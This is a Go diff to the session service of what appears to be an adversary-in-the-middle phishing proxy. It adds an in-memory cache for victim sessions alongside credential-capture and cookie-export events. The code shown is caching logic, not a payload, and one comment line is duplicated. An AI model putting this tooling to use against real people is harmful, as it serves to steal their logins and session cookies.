@@ -2,8 +2,8 @@ package aitm
 
 import (
 	"encoding/json"
-	"fmt"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/google/uuid"
@@ -194,19 +194,15 @@ type CookieExport struct {
 }
 
 // SessionService owns all business logic for session lifecycle.
+// SessionService owns all business logic for session lifecycle.
+// Sessions are persisted on creation (one write per victim) and on credential
+// capture / completion. The in-memory cache eliminates database reads from the
+// proxy hot path — Get checks the cache first and only falls back to the store
+// for completed sessions from previous daemon runs.
 type SessionService struct {
 	Store sessionStore
 	Bus   eventBus
-}
-
-func (s *SessionService) Create(session *Session) error {
-	if err := s.Store.CreateSession(session); err != nil {
-		return err
-	}
-
-	s.Bus.Publish(Event{Type: EventSessionCreated, Payload: session})
-
-	return nil
+	cache sync.Map // id → *Session
 }
 
 func (s *SessionService) Complete(session *Session) error {
@@ -216,6 +212,7 @@ func (s *SessionService) Complete(session *Session) error {
 		return err
 	}
 
+	s.cache.Delete(session.ID)
 	s.Bus.Publish(Event{Type: EventSessionCompleted, Payload: session})
 
 	return nil
@@ -229,13 +226,14 @@ func (s *SessionService) CaptureCredentials(session *Session) error {
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-
 	s.Bus.Publish(Event{Type: EventCredsCaptured, Payload: session})
-
 	return nil
 }
 
 func (s *SessionService) Get(id string) (*Session, error) {
+	if cached, ok := s.cache.Load(id); ok {
+		return cached.(*Session), nil
+	}
 	return s.Store.GetSession(id)
 }
 
@@ -248,6 +246,7 @@ func (s *SessionService) Count(f SessionFilter) (int, error) {
 }
 
 func (s *SessionService) Delete(id string) error {
+	s.cache.Delete(id)
 	return s.Store.DeleteSession(id)
 }
 
@@ -269,9 +268,10 @@ func (s *SessionService) NewSession(ctx *ProxyContext) (*Session, error) {
 	}
 
 	if err := s.Store.CreateSession(sess); err != nil {
-		return nil, fmt.Errorf("creating session: %w", err)
+		return nil, err
 	}
 
+	s.cache.Store(sess.ID, sess)
 	s.Bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
 
 	return sess, nil
